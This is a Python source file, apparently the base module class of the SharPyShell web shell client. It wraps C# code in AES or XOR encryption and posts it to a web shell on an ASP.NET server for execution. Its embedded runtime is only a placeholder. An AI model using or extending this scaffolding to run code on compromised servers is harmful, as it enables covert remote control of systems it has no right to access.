from core.ChannelAES import ChannelAES
from core.ChannelXOR import ChannelXOR
from utils.Singleton import Singleton
import base64
import traceback


class ModuleException(ValueError):
    pass


class Module(Singleton):
    # Override these properties
    _exception_class = ModuleException
    short_help = "Short Help"
    complete_help = r""" 
            Complete Help
            Usage:
                #command command [args]
        """
    '''runtime_code must have the class name "SharPyShell" and the main function name "ExecRuntime". The ExecRuntime 
       function will be the code run on the server and it must return results in byte[] type '''
    _runtime_code = r"""
                using System;using System.IO;using System.Diagnostics;using System.Text;
                public class SharPyShell
                {                    
                    string DynamicFunc(string arg)
                    {
                        return "Override the Runtime Code: " + arg;
                    }
                    
                    public byte[] ExecRuntime()
                    {
                        string output_func=DynamicFunc(@"%s");
                        byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
                        return(output_func_byte);
                    }
                }
    """
    # End Override these properties

    def __init__(self, password, channel_enc_mode, module_settings, request_object):
        self._password = password
        self._module_settings = module_settings
        self._channel_enc_mode = channel_enc_mode
        if 'aes' in channel_enc_mode:
            self._channel_enc_obj = ChannelAES(password)
        else:
            self._channel_enc_obj = ChannelXOR(password)
        self._request_object = request_object

    # Override this method
    def _create_request(self, args):
        cmd = ''.join(args)
        return self._runtime_code % cmd
    # End Override this method

    def _encrypt_request(self, request_clear):
        request_encrypted = self._channel_enc_obj.encrypt(request_clear.encode())
        request_encrypted_encoded = base64.b64encode(request_encrypted)
        return request_encrypted_encoded.decode()

    def _post_request(self, request_encrypted_encoded):
        response_status_code, response_headers, response_text = \
            self._request_object.send_request(request_encrypted_encoded)
        if response_status_code != 200:
            raise self._exception_class('{{{' + str(self._exception_class.__name__) + '}}}\n' +
                                        str(response_headers) + '\n\n' +
                                        str(response_text))
        return response_text

    def _decrypt_response(self, encrypted_response_encoded):
        response_encrypted = base64.b64decode(encrypted_response_encoded)
        response_clear = self._channel_enc_obj.decrypt(response_encrypted)
        return response_clear

    def _parse_response(self, response):
        response = response.decode() if isinstance(response, bytes) else response
        if '{{{' + self._exception_class.__name__ + '}}}' in response:
            raise self._exception_class(str(response))
        if '{{{SharPyShellError}}}' in response or '{{{PythonError}}}' in response:
            raise self._exception_class('{{{' + self._exception_class.__name__ + '}}}' + str(response))
        return str(response)

    def run(self, args):
        try:
            request = self._create_request(args)
            encrypted_request = self._encrypt_request(request)
            encrypted_response = self._post_request(encrypted_request)
            decrypted_response = self._decrypt_response(encrypted_response)
            parsed_response = self._parse_response(decrypted_response)
        except ModuleException as module_exc:
            parsed_response = str(module_exc)
        except Exception:
            parsed_response = '{{{' + self._exception_class.__name__ + '}}}' + '{{{PythonError}}}\n' +\
                              str(traceback.format_exc())
        return parsed_response
